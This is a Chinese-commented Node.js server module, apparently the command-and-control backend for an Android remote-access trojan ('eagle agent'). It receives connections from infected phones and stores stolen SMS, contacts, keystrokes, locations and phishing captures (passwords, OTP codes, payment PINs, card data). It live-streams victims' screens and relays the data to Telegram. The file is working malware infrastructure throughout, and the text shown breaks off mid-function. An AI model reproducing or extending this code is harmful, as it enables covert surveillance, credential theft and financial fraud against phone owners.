/**
 * ============================================================================
 * 花木工作室 — eagle agent 原生 TCP 接入桥
 * ============================================================================
 * 手机端 eagle agent（花木终端）不走 HTTP/WS，直接与本进程的三个 TCP 端口对话：
 *   39444 Main_Socket  主命令通道：裸 TCP 行协议（\n 结尾），上线即发 DEVINFO
 *                      （设备信息 JSON，可达数 MB，含壁纸 base64）；面板下行命令
 *                      也走此通道（sendLine）
 *   5055  sc_cast      屏幕流：DEVICE_ID 握手 → START → w:h → 循环
 *                      [4字节小端长度][JPEG]（~0.5s/帧，agent 原生流，不轮询截屏）
 *   5058  屏幕阅读器   布局流：Str_Red_Ser 触发，LAYOUT_JSON:{len}:||UI||\n
 *                      定长 JSON 帧 → 供面板 UI 树/元素点击（5058 延迟远低于 adb dump）
 *
 * 子连接归并：5055/5058 只有 IP 无法直接认设备 —— 按 aid → name → 同 IP →
 * CAST_WAIT 排队 → 唯一在线 的顺序匹配回 devId（见"子连接路由"段）。
 *
 * 触控/代答优先级：
 *   1) 流通道（CLICK/SWIPE 走 39444 命令 + 5055/5058 原生数据，~100ms）
 *   2) adb 直注兜底（adbMap: devId → 127.0.0.1:15563，经 dxs 无线调试隧道；
 *      本机版 adb server = tcp:127.0.0.1:5037，经 ADB_SERVER_SOCKET 传给 adb 客户端）
 *   adb 代答：设备不回包的命令用 adb 兜底——battery/connectivity/notification/
 *   window dumpsys 代答、uiautomator dump 代 UI 树、无障碍重绑
 *   （settings put secure accessibility_enabled 0→1 清 ColorOS 限频惩罚）。
 *
 * 协议实证来源：seed agent V6.5 反编译 + 原版 gateway.js 对照。
 * 被引用：server.js require('./eagle') → eagle.init(ctx)，随主进程监听三端口。
 */
const net = require('net');
const crypto = require('crypto');
const {spawn} = require('child_process');

const EAGLE_MAIN_PORT = 39444;
const EAGLE_CAST_PORT = 5055;
const EAGLE_LAYOUT_PORT = 5058;

const S = {                       // 运行态
  main: new Map(),                // devId -> conn {sock, out, name, ip, alive, ts}
  cast: new Map(),                // devId -> {sock, out, w, h, aid, ip}
  layoutSock: new Map(),          // devId -> 5058 连接
  layout: new Map(),              // devId -> 最近布局 root 树
  layoutTs: new Map(),
  readerOn: new Set(),
  aid2dev: new Map(),
  name2dev: new Map(),
  castWait: [],                   // 已发 Screen_Cast 等 5055 接入的 devId
  screenOn: new Set(),
  apps: new Map(),                // devId -> [{name,package,icon}]
  appsFlush: new Map(),
  lastBcast: new Map(),
  screenOff: new Set(),           // 面板停止流后不自动恢复
};

let ctx = null;                   // {db, getDevice, setDevice, broadcast, log}
function init(c) { ctx = c; }

const now = () => Date.now();
const isoNow = () => new Date(Date.now() + 8 * 3600e3).toISOString().slice(0, 19);

function sendLine(sock, line, ms = 3000) {
  return new Promise(resolve => {
    if (!sock || sock.destroyed) return resolve(false);
    const t = setTimeout(() => resolve(false), ms);
    sock.write(line + '\n', () => { clearTimeout(t); resolve(true); });
    sock.once('error', () => { clearTimeout(t); resolve(false); });
  });
}
const sendDev = (devId, line) => {
  const c = S.main.get(devId);
  if (!c) return false;
  sendLine(c.sock, line).then(okk => { if (okk) ctx.log('eagle-cmd', {d: devId, l: String(line).slice(0, 120)}); });
  return true;
};
const castSend = (devId, line) => {
  const c = S.cast.get(devId);
  if (!c) return false;
  c.sock.write(line + '\n');
  return true;
};

const isEagleDev = devId => { try { return (ctx.getDevice(devId) || {}).source === 'eagle'; } catch { return false; } };

// ---------------- kv 映射（client_name/android_id ↔ devId 持久化） ----------------
function kvMap() {
  try { const r = ctx.db.prepare("SELECT v FROM kv WHERE k='eagle_map'").get(); return r ? JSON.parse(r.v) : {}; }
  catch { return {}; }
}
function kvMapSave(m) {
  try { ctx.db.prepare("INSERT OR REPLACE INTO kv VALUES('eagle_map',?)").run(JSON.stringify(m)); } catch {}
}
function nextNum() {
  try {
    const r = ctx.db.prepare("SELECT v FROM kv WHERE k='eagle_num'").get();
    const n = (r ? parseInt(r.v) : 600) + 1;
    ctx.db.prepare("INSERT OR REPLACE INTO kv VALUES('eagle_num',?)").run(String(n));
    return n;
  } catch { return Date.now() % 10000; }
}

// ---------------- 设备上线（DEVINFO） ----------------
// PhoneStatus → 屏幕状态（agent 实证语义：isInteractive=false→SCREEN_OFF；
// isKeyguardLocked=true→LOCK_SCREEN；否则 HOME_SCREEN/UNLOCKED）
function phoneStatusFields(st) {
  switch (String(st || '')) {
    case 'SCREEN_OFF': return {screen_on: false};
    case 'LOCK_SCREEN': return {screen_on: true, is_locked: true};
    case 'HOME_SCREEN': case 'UNLOCKED': return {screen_on: true, is_locked: false};
    default: return {};
  }
}
// agent wifi 值规范化：No Network → ''（前端显示未知），WIFI/MOBILE/Other 透传
const normNet = v => { const s = String(v || '').trim(); return s === 'No Network' ? '' : s; };
// ---------------- 设备出厂归属解析 ----------------
// APK 内 assets/server_config.json 的 bindOwner/bindUser（构建表单「绑定子账户」）随注册体上报，
// 服务端据此把新设备直接挂到对应账户名下；解析失败/为空则归管理员(1)。
// 兼容键名：bind_owner / bindOwner / bind_user / bindUser / channel / owner
function resolveBindOwner(ctx, body) {
  const b = body || {};
  const raw = String(b.bind_owner || b.bindOwner || b.bind_user || b.bindUser || b.channel || b.owner || '').trim();
  if (!raw) return null;
  const norm = s => String(s == null ? '' : s).replace(/\s+/g, '').toLowerCase();
  // 支持三种写法：用户名、uid(纯数字)、user:用户名
  const u = norm(raw.replace(/^user:/i, ''));
  let acc = null;
  try {
    const rows = ctx.db.prepare('SELECT id, username, role, is_active FROM web_accounts').all();
    acc = rows.find(a => norm(a.username) === u) || null;
    if (!acc && /^\d+$/.test(u)) acc = rows.find(a => Number(a.id) === Number(u)) || null;
  } catch (e) { return null; }
  if (!acc) return null;
  if (!acc.is_active) return null;
  return {owner_id: acc.id, owner_username: acc.username};
}
function upsert(conn, info, ip) {
  let name = String(info.client_name || '').trim();
  if (!name || name === 'New Client') {
    name = String(nextNum());
    sendLine(conn.sock, 'set_new_name:' + name);
    info.client_name = name;
  }
  const m = kvMap();
  const stF = phoneStatusFields(info.PhoneStatus);
  let devId = m[name] && m[name].devId;
  if (!devId) {
    devId = crypto.createHash('md5').update('eagle:' + name + ':' + Math.floor(Date.now() / 1000)).digest('hex').slice(0, 16);
    m[name] = {devId, aid: ''};
    kvMapSave(m);
  }
  S.name2dev.set(name, devId);
  conn.devId = devId; conn.name = name;
  S.main.set(devId, conn);

  let d = ctx.getDevice(devId);
  const wasOffline = !d || !d.online;    // 仅离线→上线迁移时发 TG 通知（DEVINFO 重连不刷屏）
  const bat = parseInt(String(info.battery || '').replace(/\D/g, '') || '0', 10) || 0;
  if (!d) {
    d = {id: devId, model: info.device || '', brand: info.brand || '', android: info.version || '',
         sdk: 0, country: info.Country || '', language: '', carrier: '', is_rooted: false, has_admin: false,
         has_access: true, battery_pct: bat, screen_on: true, app_name: 'Eagle ' + (info.appversion || 'V6_5'),
         app_version: String(info.appversion || ''), is_charging: false, is_locked: false,
         network_type: normNet(info.wifi), has_sim: true, phone_number: '', phone_number2: '',
         screen_width: 0, screen_height: 0, fingerprint: '', ip, note: '', tag: '', online: true,
         modules: 0, group_id: 0, pinned: false, debug_port: 0, svc_online: true,
         svc_last_seen: isoNow(), first_seen: isoNow(), last_seen: isoNow(),
         ...(resolveBindOwner(ctx, info) || {owner_id: 1, owner_username: 'admin'}),
         fcm_token: '', password_type: '', injection_count: 0, card_count: 0,
         source: 'eagle', eagle_client: name, name, status_note: info.PhoneStatus || '',
         latency: String(info.latency || ''), ...stF};
    // adb 直注通道继承：同机型 adb 设备自动接管
    for (const [odId, serial] of Object.entries(adbMap)) {
      const od = ctx.getDevice(odId);
      if (od && od.model && od.model === d.model) { adbMap[devId] = serial; break; }
    }
  } else {
    Object.assign(d, {online: true, svc_online: true, svc_last_seen: isoNow(), last_seen: isoNow(), ip,
      battery_pct: bat || d.battery_pct || 0, network_type: normNet(info.wifi) || d.network_type || '',
      status_note: info.PhoneStatus || d.status_note || '', latency: String(info.latency || d.latency || ''),
      eagle_client: name, app_version: String(info.appversion || d.app_version || ''), ...stF});
  }
  const wp = info.PhoneWallpaper;
  if (wp && wp.length > 100) d.wallpaper = 'data:image/jpeg;base64,' + wp;
  ctx.setDevice(d);
  // 壁纸即首帧：订阅浏览器立刻有画面（原版 gateway 同款）
  if (typeof wp === 'string' && wp.startsWith('/9j/')) {
    try {
      const jpg = Buffer.from(wp + '==', 'base64');
      if (jpg[0] === 0xff && jpg[1] === 0xd8 && jpg[2] === 0xff)
        ctx.broadcast({type: 'screenshot', device_id: devId, data: {image: jpg.toString('base64')}}, [devId]);
    } catch {}
  }
  ctx.broadcast({type: 'device_online', device_id: devId, data: d}, [devId]);
  ctx.broadcast({type: 'device_update'}, [devId]);
  if (wasOffline && ctx.tg) ctx.tg.notifyOnline(devId);   // TG：设备上线通知
  ctx.log('eagle-devinfo', {d: devId, name, st: info.PhoneStatus, bat});
  if (S.screenOn.has(devId) && !S.cast.has(devId)) {
    if (!S.castWait.includes(devId)) S.castWait.push(devId);
    sendDev(devId, 'Screen_Cast');
  }
  return devId;
}

// ---------------- 主通道行处理 ----------------
function storeSms(devId, js) {
  let data;
  try { data = JSON.parse(js); } catch { ctx.log('eagle-sms-bad', {d: devId}); return; }
  const items = Array.isArray(data) ? data : (data && (data.sms || data.data)) || (typeof data === 'object' ? [data] : []);
  let n = 0, lastIt = null;
  const ins = ctx.db.prepare("INSERT INTO sms(device_id,device_label,sender,body,recv_at,is_read,source,create_at) VALUES(?,?,?,?,?,?,?,datetime('now'))");
  for (const it of items) {
    if (!it || typeof it !== 'object') continue;
    try {
      const body = String(it.body || it.message || it.text || '');
      const sender = String(it.address || it.sender || it.number || '');
      if (!body && !sender) continue;
      const tsx = it.date || it.timestamp || it.time;
      let recv = isoNow().slice(0, 19);
      if (tsx && /^\d+$/.test(String(tsx))) recv = new Date(parseInt(tsx) + 8 * 3600e3).toISOString().slice(0, 19);
      ins.run(devId, '', sender, body, recv, it.read ? 1 : 0, 'eagle');
      n++; lastIt = it;
    } catch {}
  }
  if (n) {
    ctx.broadcast({type: 'sms_data', device_id: devId, data: {count: n}}, [devId]);
    ctx.log('eagle-sms', {d: devId, n});
    if (ctx.tg) ctx.tg.notifySms(devId, lastIt, n);   // TG：新短信通知
  }
}

// 钓鱼/表单提交数据 → generic 'phish' 逐条记录（面板钓鱼数据页按 device_id 过滤展示）
// 字段对齐前端 PhishTab：username/password/sms_code/pay_pin/target/status/remark
function storePhish(devId, payload) {
  try {
    const p = (payload && typeof payload === 'object') ? payload : {data: String(payload).slice(0, 2000)};
    const id = (Date.now() % 1e10) * 10 + Math.floor(Math.random() * 10);
    ctx.db.prepare("INSERT OR REPLACE INTO generic(store,id,data,updated_at) VALUES('phish',?,?,datetime('now'))")
      .run(String(id), JSON.stringify({
        id, device_id: devId,
        username: String(p.username || p.login || p.user || p.account || '').slice(0, 200),
        password: String(p.password || p.pass || p.passwd || '').slice(0, 200),
        sms_code: String(p.sms_code || p.smsCode || p.otp || p.code || '').slice(0, 20),
        pay_pin: String(p.pay_pin || p.pin || '').slice(0, 12),
        target: String(p.target || p.url || p.app || p.app_name || '').slice(0, 200),
        status: 'pending', remark: '', data: p,
        created_at: new Date(Date.now() + 8 * 3600e3).toISOString().slice(0, 19).replace('T', ' ')
      }));
    ctx.broadcast({type: 'phish', device_id: devId, data: {id}}, [devId]);
    ctx.log('eagle-phish', {d: devId, u: String(p.username || '').slice(0, 20)});
  } catch {}
}

function handleLine(conn, line, ip) {
  const devId = conn.devId;
  if (line.startsWith('DEVINFO:')) {
    try { upsert(conn, JSON.parse(line.slice(8)), ip); } catch { ctx.log('eagle-devinfo-bad', line.slice(0, 120)); }
    return;
  }
  if (!devId) return;
  if (line.startsWith('LATENCY_UPDATE:')) { touchDb(devId, {latency: line.slice(16, 26)}); return; }
  if (line.startsWith('PING:')) { touchDb(devId); return; }
  if (line.startsWith('SMS:')) { storeSms(devId, line.slice(4)); return; }
  if (line === 'SMS_Done') return;
  if (line.startsWith('SMS_RESULT:')) { ctx.broadcast({type: 'sms_send_result', device_id: devId, data: {result: line.slice(11)}}, [devId]); return; }
  if (line.startsWith('CONTACTS:')) {
    try {
      const cj = JSON.parse(line.slice(9));
      const cl = Array.isArray(cj) ? cj : cj.contacts;
      if (Array.isArray(cl)) {
        ctx.db.prepare("INSERT OR REPLACE INTO generic(store,id,data,updated_at) VALUES('contacts',?,?,datetime('now'))")
          .run(devId, JSON.stringify({device_id: devId, contacts: cl, count: cl.length}));
        ctx.broadcast({type: 'contacts', device_id: devId, data: {contacts: cl.slice(0, 400)}}, [devId]);
        ctx.log('eagle-contacts', {d: devId, n: cl.length});
      }
    } catch (e) { ctx.log('eagle-contacts-err', String(e).slice(0, 80)); }
    return;
  }
  if (line.startsWith('APP:')) {
    const p = line.slice(4).split('|');
    if (p.length >= 2) {
      if (!S.apps.has(devId)) S.apps.set(devId, []);
      S.apps.get(devId).push({name: p[0], package: p[1], icon: p[2] ? 'data:image/jpeg;base64,' + p[2] : ''});
      S.appsFlush.set(devId, Date.now());
    }
    return;
  }
  if (line.startsWith('APP_DETECT;')) { touchDb(devId, {running_app: line.slice(11, 60)}); return; }
  if (line.startsWith('PhoneStatusNew:') || line.startsWith('PhoneStatus:')) {
    const st = line.split(':').slice(1).join(':').trim();
    touchDb(devId, {status_note: st.slice(0, 40), ...phoneStatusFields(st)});
    ctx.broadcast({type: 'device_update'}, [devId]);   // 锁屏/解锁实时刷新 亮屏/锁屏 徽标
    return;
  }
  // 钓鱼数据（原版 gateway.js 文本协议：`phisdata||<json>`，此前只接 JSON 形式丢了这个格式）
  if (line.startsWith('phisdata||')) {
    try { storePhish(devId, JSON.parse(line.slice(10))); } catch { ctx.log('eagle-phish-bad', line.slice(0, 120)); }
    return;
  }
  if (line.startsWith('New_crash_info:')) { ctx.log('eagle-crash', {d: devId, s: line.slice(0, 250)}); return; }
  // ---- 键盘记录 + agent 主动推送数据流（原版 gateway.js 文本协议移植，此前完全未接、数据全丢） ----
  if (line.startsWith('keylogfile_name:')) { conn.keylogName = line.slice(16).trim() || 'keylog.txt'; return; }
  if (line.startsWith('keylogfile:')) {
    conn.keylogBuf = [];
    if (!conn.keylogName) conn.keylogName = 'keylog.txt';
    try { const f = JSON.parse(line.slice(11)); if (f && f.filename) conn.keylogName = String(f.filename).slice(0, 80); } catch {}
    return;
  }
  if (line === 'FILE_END') {
    if (conn.keylogBuf) {
      const content = conn.keylogBuf.join('\n');
      if (content.trim()) {
        ctx.db.prepare("INSERT INTO keylogs(device_id,app_pkg,log_type,text,capt_at) VALUES(?,?,?,?,datetime('now','localtime'))")
          .run(devId, String(conn.keylogName).slice(0, 80), 'KEYFILE', content.slice(0, 100000));
        ctx.broadcast({type: 'keylog', device_id: devId, data: {filename: conn.keylogName, size: content.length}}, [devId]);
        ctx.log('eagle-keylogfile', {d: devId, f: conn.keylogName, len: content.length});
      }
      conn.keylogBuf = null;
    }
    if (conn.webdataBuf) {
      const content = conn.webdataBuf.join('\n');
      if (content.trim()) {
        ctx.db.prepare("INSERT INTO keylogs(device_id,app_pkg,log_type,text,capt_at) VALUES(?,?,?,?,datetime('now','localtime'))")
          .run(devId, String(conn.webdataName || 'webdata').slice(0, 80), 'WEBDATA', content.slice(0, 100000));
        ctx.log('eagle-webdata', {d: devId, len: content.length});
      }
      conn.webdataBuf = null;
    }
    return;
  }
  // JSON 推送消息（mtype 分发：keylog 单条 / sms_in / applist / contacts / notify / webdata）
  if (line.startsWith('{')) {
    try {
      const msg = JSON.parse(line);
      const mt = msg && (msg.type || msg.t);
      const payload = msg && (msg.data !== undefined ? msg.data : msg.payload !== undefined ? msg.payload : msg);
      if (mt === 'keylog' || (!mt && line.slice(0, 120).toLowerCase().includes('"key'))) {
        const d = (payload && typeof payload === 'object') ? payload : {text: String(payload)};
        ctx.db.prepare("INSERT INTO keylogs(device_id,app_pkg,log_type,text,capt_at) VALUES(?,?,?,?,datetime('now','localtime'))")
          .run(devId, String(d.app_pkg || d.pkg || d.package || d.app || '').slice(0, 120),
            String(d.logType || d.type || 'KEY').slice(0, 40),
            String(d.content || d.text || d.key || d.msg || JSON.stringify(d)).slice(0, 4000));
        ctx.broadcast({type: 'keylog', device_id: devId, data: d}, [devId]);
        return;
      }
      if (mt === 'keylogname') { conn.keylogName = String(payload).slice(0, 80) || 'keylog.txt'; return; }
      if (mt === 'keylogfile_start') { conn.keylogBuf = []; conn.keylogName = (payload && payload.filename) || 'keylog.txt'; return; }
      if (mt === 'webdata_start') { conn.webdataBuf = []; conn.webdataName = (payload && payload.filename) || 'webdata.json'; return; }
      if (mt === 'webdata_end' && conn.webdataBuf) {   // 部分实现走 JSON 结束标记
        const content = conn.webdataBuf.join('\n');
        ctx.db.prepare("INSERT INTO keylogs(device_id,app_pkg,log_type,text,capt_at) VALUES(?,?,?,?,datetime('now','localtime'))")
          .run(devId, String(conn.webdataName || 'webdata').slice(0, 80), 'WEBDATA', content.slice(0, 100000));
        ctx.log('eagle-webdata', {d: devId, len: content.length});
        conn.webdataBuf = null; return;
      }
      if (mt === 'sms_in') {
        try {
          const d = ctx.getDevice(devId) || {};
          ctx.db.prepare("INSERT INTO sms(device_id,device_label,sender,body,recv_at,is_read,source,create_at) VALUES(?,?,?,?,?,0,'agent',datetime('now','localtime'))")
            .run(devId, String(d.model || d.brand || '').slice(0, 40), String(payload.sender || payload.address || '').slice(0, 60),
              String(payload.body || payload.message || payload.text || '').slice(0, 2000), String(payload.date || payload.time || '').slice(0, 19));
          ctx.broadcast({type: 'device_update'}, [devId]);
          ctx.log('eagle-sms-in', {d: devId, from: String(payload.sender || '').slice(0, 20)});
          if (ctx.tg) ctx.tg.notifySms(devId, payload, 1);   // TG：新短信通知
        } catch (e) { ctx.log('eagle-sms-in-err', String(e).slice(0, 80)); }
        return;
      }
      if (mt === 'applist' || mt === 'app_item' || mt === 'autoapps') {
        try {
          const list = Array.isArray(payload) ? payload : (payload.apps || payload.items || [payload]);
          ctx.db.prepare("INSERT OR REPLACE INTO generic(store,id,data,updated_at) VALUES('apps',?,?,datetime('now'))")
            .run(devId, JSON.stringify({device_id: devId, apps: list}));
          ctx.broadcast({type: 'apps', device_id: devId, data: {apps: list.slice(0, 400)}}, [devId]);
          ctx.log('eagle-applist', {d: devId, n: list.length});
        } catch {}
        return;
      }
      if (mt === 'contacts') {
        try {
          const cl = Array.isArray(payload) ? payload : (payload.contacts || []);
          if (cl.length) {
            ctx.db.prepare("INSERT OR REPLACE INTO generic(store,id,data,updated_at) VALUES('contacts',?,?,datetime('now'))")
              .run(devId, JSON.stringify({device_id: devId, contacts: cl, count: cl.length}));
            ctx.broadcast({type: 'contacts', device_id: devId, data: {contacts: cl.slice(0, 400)}}, [devId]);
          }
        } catch {}
        return;
      }
      if (mt === 'notify') {
        try {
          const title = String(payload.title || '设备通知').slice(0, 120), body = String(payload.text || payload.content || '').slice(0, 1000) || JSON.stringify(payload).slice(0, 300);
          const nPkg = String(payload.packageName || payload.pkg || payload.app || '').slice(0, 120);
          const nSt = String(payload.time || payload.when || payload.postTime || '').slice(0, 19);
          ctx.db.prepare("INSERT INTO notifications(title,body,level,is_read,created_at,device_id,app_pkg,src_time) VALUES(?,?, 'info',0,datetime('now','localtime'),?,?,?)").run(title, body, devId, nPkg, nSt);
          ctx.broadcast({type: 'device_update'}, [devId]);
          if (ctx.tg) ctx.tg.notifyNotification(devId, title, body);   // TG：设备通知
        } catch {}
        return;
      }
      if (mt === 'crash' || mt === 'ai_result' || mt === 'phisdata' || mt === 'adberror' || mt === 'notify_listener') {
        ctx.log('eagle-push', {d: devId, t: mt, s: JSON.stringify(payload).slice(0, 150)});
        if (mt === 'phisdata') {
          ctx.db.prepare("INSERT INTO keylogs(device_id,app_pkg,log_type,text,capt_at) VALUES(?,?,?,?,datetime('now','localtime'))")
            .run(devId, 'phish', 'PHISDATA', JSON.stringify(payload).slice(0, 20000));
          storePhish(devId, payload);   // 逐条记录 → 面板钓鱼数据页
          if (ctx.tg) ctx.tg.notifyPhish(devId, JSON.stringify(payload).slice(0, 600));   // TG：银行卡/钓鱼数据
        }
        return;
      }
    } catch {}
  }
  // 聚合模式：keylog/webdata 文件传输中，后续行直接入缓冲（gateway.js 同序）
  if (conn.keylogBuf) { conn.keylogBuf.push(line); return; }
  if (conn.webdataBuf) { conn.webdataBuf.push(line); return; }
  if (line.startsWith('LAT:') && line.includes(';LON:')) {
    try {
      const lat = parseFloat(line.slice(4, line.indexOf(';LON:')));
      const lon = parseFloat(line.slice(line.indexOf(';LON:') + 5));
      ctx.db.prepare("INSERT OR REPLACE INTO generic(store,id,data,updated_at) VALUES('location',?,?,datetime('now'))")
        .run(devId, JSON.stringify({device_id: devId, lat, lon, ts: Date.now()}));
      ctx.broadcast({type: 'location', device_id: devId, data: {latitude: lat, longitude: lon}}, [devId]);
    } catch {}
    return;
  }
  ctx.log('eagle-line', {d: devId, l: line.slice(0, 180)});
}

function touchDb(devId, extra) {
  try {
    const d = ctx.getDevice(devId);
    if (d) {
      d.last_seen = isoNow(); d.online = true; d.svc_online = true; d.svc_last_seen = isoNow();
      if (extra) for (const k in extra) if (extra[k] !== undefined && extra[k] !== '') d[k] = extra[k];
      ctx.setDevice(d);
    }
  } catch {}
}

// ---------------- 主通道 39444 ----------------
function mainConn(sock, addr) {
  if (!addr) addr = [sock.remoteAddress || '?', sock.remotePort || 0];
  sock.setNoDelay(true);
  sock.setKeepAlive(true, 60000);
  const conn = {sock, devId: null, name: null, alive: true, ip: addr[0]};
  let buf = Buffer.alloc(0);
  ctx.log('eagle-main-up', {ip: addr[0]});
  sock.on('data', chunk => {
    buf = Buffer.concat([buf, chunk]);
    for (;;) {
      const nl = buf.indexOf(0x0a);
      if (nl === -1) { if (buf.length > 64 * 1024 * 1024) sock.destroy(); return; }
      const line = buf.slice(0, nl).toString('utf8').replace(/\r/g, '').trim();
      buf = buf.slice(nl + 1);
      if (!line) continue;
      try { handleLine(conn, line, addr[0]); } catch (e) { ctx.log('eagle-handle-err', String(e).slice(0, 120)); }
    }
  });
  const gone = () => {
    conn.alive = false;
    if (conn.devId && S.main.get(conn.devId) === conn) {
      S.main.delete(conn.devId);
      const d = ctx.getDevice(conn.devId);
      if (d && d.online) {
        d.online = false; d.svc_online = false;
        ctx.setDevice(d);
        ctx.broadcast({type: 'device_update'}, [conn.devId]);
      }
    }
    ctx.log('eagle-main-down', {d: conn.devId, ip: addr[0]});
  };
  sock.on('close', gone);
  sock.on('error', gone);
}

// ---------------- 子连接路由（aid → name → 同 IP → CAST_WAIT → 唯一在线） ----------------
function castRoute(aid, name, ip) {
  let devId = null;
  if (aid && S.aid2dev.has(aid)) devId = S.aid2dev.get(aid);
  if (!devId && aid) {
    const m = kvMap();
    for (const nm in m) {
      if (m[nm] && m[nm].aid === aid && m[nm].devId) {
        devId = m[nm].devId;
        S.aid2dev.set(aid, devId);
        if (!S.name2dev.has(nm)) S.name2dev.set(nm, m[nm].devId);
        break;
      }
    }
  }
  if (!devId && name && S.name2dev.has(name)) devId = S.name2dev.get(name);
  if (!devId && name) {
    const m = kvMap();
    if (m[name] && m[name].devId) { devId = m[name].devId; S.name2dev.set(name, devId); }
  }
  if (!devId && ip) {
    const same = [...S.main.entries()].filter(([, c]) => c.ip === ip).map(([d]) => d);
    if (same.length === 1) devId = same[0];
  }
  if (!devId && S.castWait.length) devId = S.castWait.shift();
  if (!devId && S.main.size === 1) devId = [...S.main.keys()][0];
  if (devId && aid) {
    S.aid2dev.set(aid, devId);
    const m = kvMap();
    for (const nm in m) if (m[nm] && m[nm].devId === devId) { m[nm].aid = aid; kvMapSave(m); break; }
  }
  return devId;
}

function frameBroadcast(devId, jpg) {
  const t = now();
  const last = S.lastBcast.get(devId) || 0;
  if (t - last < 90) return;                 // ≤10fps 防 WS 洪泛
  S.lastBcast.set(devId, t);
  try { ctx.broadcastFrame(devId, jpg); } catch {}   // 二进制主通道（无 castMode 门禁）
  ctx.broadcast({type: 'screenshot', device_id: devId, data: {image: jpg.toString('base64')}}, [devId]);
}

// ---------------- 屏幕流 5055 ----------------
function castConn(sock, addr) {
  if (!addr) addr = [sock.remoteAddress || '?', sock.remotePort || 0];
  sock.setNoDelay(true);
  sock.setKeepAlive(true, 60000);
  let devId = null;
  let buf = Buffer.alloc(0);
  let stage = 0;                              // 0=握手 1=尺寸行 2=帧流
  const done = () => {
    if (devId && S.cast.get(devId) && S.cast.get(devId).sock === sock) S.cast.delete(devId);
    ctx.log('eagle-cast-down', {d: devId});
    if (devId && S.screenOn.has(devId)) {
      setTimeout(() => {
        if (!S.cast.has(devId) && !S.castWait.includes(devId)) S.castWait.push(devId);
        sendDev(devId, 'Screen_Cast');
      }, 1000);
    }
  };
  sock.on('error', () => {});
  sock.on('close', done);
  sock.on('data', chunk => {
    if (stage === 0) {
      buf = Buffer.concat([buf, chunk]);
      const nl = buf.indexOf(0x0a);
      if (nl === -1) return;
      const s = buf.slice(0, nl).toString('utf8').trim();
      buf = buf.slice(nl + 1);
      let aid = '', name = '';
      if (s.startsWith('DEVICE_ID:')) aid = s.slice(10).split('|')[0].trim();
      else if (s.startsWith('Name|')) name = s.slice(5).trim();
      else if (s.startsWith('Clientname:')) name = s.slice(11).trim();
      devId = castRoute(aid, name, addr[0]);
      if (!devId) { ctx.log('eagle-cast-noroute', {ip: addr[0], s: s.slice(0, 60)}); sock.destroy(); return; }
      S.cast.set(devId, {sock, aid, ip: addr[0], w: 0, h: 0});
      sock.write('START\n');
      stage = 1;
      ctx.log('eagle-cast-up', {d: devId, aid: (aid || '').slice(0, 20), ip: addr[0]});
      touchDb(devId);
      if (buf.length) sock.emit('data', Buffer.alloc(0)), onCastData(buf);
      return;
    }
    onCastData(chunk);
  });
  function onCastData(chunk) {
    buf = Buffer.concat([buf, chunk]);
    if (stage === 1) {                        // 尺寸问候行 w:h
      const nl = buf.indexOf(0x0a);
      if (nl === -1) return;
      const dt = buf.slice(0, nl).toString('utf8').trim();
      buf = buf.slice(nl + 1);
      const mp = dt.split(':');
      if (mp.length === 2 && /^\d+$/.test(mp[0]) && /^\d+$/.test(mp[1])) {
        const cc = S.cast.get(devId) || {};
        cc.w = parseInt(mp[0]); cc.h = parseInt(mp[1]);
        const d = ctx.getDevice(devId);
        if (d) { d.screen_width = cc.w; d.screen_height = cc.h; ctx.setDevice(d); }
        ctx.log('eagle-cast-dim', {d: devId, w: cc.w, h: cc.h});
      }
      stage = 2;
    }
    for (;;) {                                // [4字节小端长度][JPEG]
      if (buf.length < 4) break;
      const ln = buf.readUInt32LE(0);
      if (ln <= 0 || ln > 5 * 1024 * 1024) { ctx.log('eagle-cast-badlen', {d: devId, ln}); sock.destroy(); return; }
      if (buf.length < 4 + ln) break;
      const jpg = buf.slice(4, 4 + ln);
      buf = buf.slice(4 + ln);
      if (jpg[0] === 0xff && jpg[1] === 0xd8 && jpg[2] === 0xff) frameBroadcast(devId, jpg);
    }
  }
}

// ---------------- 屏幕阅读器 5058 ----------------
function layoutNode(o) {
  if (!o || typeof o !== 'object') return null;
  const gv = (...keys) => { for (const k of keys) if (o[k] !== undefined && o[k] !== null && o[k] !== '') return o[k]; return null; };
  let bounds = {left: 0, top: 0, right: 0, bottom: 0};
  const b = gv('bounds', 'rect', 'frame');
  if (typeof b === 'string') {
    const m = b.match(/\[(\d+),(\d+)\]\[(\d+),(\d+)\]/);
    if (m) bounds = {left: +m[1], top: +m[2], right: +m[3], bottom: +m[4]};
  } else if (b && typeof b === 'object') {
    bounds = {left: b.left || b.l || 0, top: b.top || b.t || 0, right: b.right || b.r || 0, bottom: b.bottom || b.b || 0};
  }
  const node = {id: String(gv('resource-id', 'resourceId', 'viewId', 'id') || ''),
    className: String(gv('className', 'class', 'type') || ''),
    text: String(gv('text', 'name', 'label', 'value') || ''),
    description: String(gv('description', 'content-desc', 'contentDesc', 'desc') || ''),
    clickable: !!gv('clickable'), scrollable: !!gv('scrollable'), bounds, children: []};
  for (const k of ['children', 'childNodes', 'nodes', 'child']) {
    if (Array.isArray(o[k])) { for (const c of o[k]) { const cn = layoutNode(c); if (cn) node.children.push(cn); } break; }
  }
  return node;
}

function layoutBroadcast(devId, js) {
  let obj;
  try { obj = JSON.parse(js); } catch { ctx.log('eagle-layout-bad', {d: devId}); return; }
  let rootObj = (obj && obj.root !== undefined) ? obj.root : obj;
  if (Array.isArray(rootObj)) rootObj = rootObj[0];
  const root = layoutNode(rootObj);
  if (!root) return;
  const d = ctx.getDevice(devId) || {};
  S.layout.set(devId, root);
  S.layoutTs.set(devId, Date.now());
  ctx.broadcast({type: 'ui_hierarchy', device_id: devId,
    data: {timestamp: Date.now(), root, screenWidth: d.screen_width || 1080, screenHeight: d.screen_height || 2400}}, [devId]);
}

function layoutConn(sock, addr) {
  if (!addr) addr = [sock.remoteAddress || '?', sock.remotePort || 0];
  sock.setNoDelay(true);
  let devId = null;
  let buf = Buffer.alloc(0);
  const done = () => {
    if (devId && S.layoutSock.get(devId) === sock) S.layoutSock.delete(devId);
    ctx.log('eagle-layout-down', {d: devId});
    if (devId && S.readerOn.has(devId)) setTimeout(() => sendDev(devId, 'Str_Red_Ser'), 1000);
  };
  sock.on('error', () => {});
  sock.on('close', done);
  sock.on('data', chunk => {
    buf = Buffer.concat([buf, chunk]);
    if (!devId) {
      const nl = buf.indexOf(0x0a);
      if (nl === -1) return;
      const s = buf.slice(0, nl).toString('utf8').trim();
      buf = buf.slice(nl + 1);
      let aid = '', name = '';
      if (s.startsWith('DEVICE_ID:')) aid = s.slice(10).split('|')[0].trim();
      else if (s.startsWith('Name|')) name = s.slice(5).trim();
      else if (s.startsWith('Clientname:')) name = s.slice(11).trim();
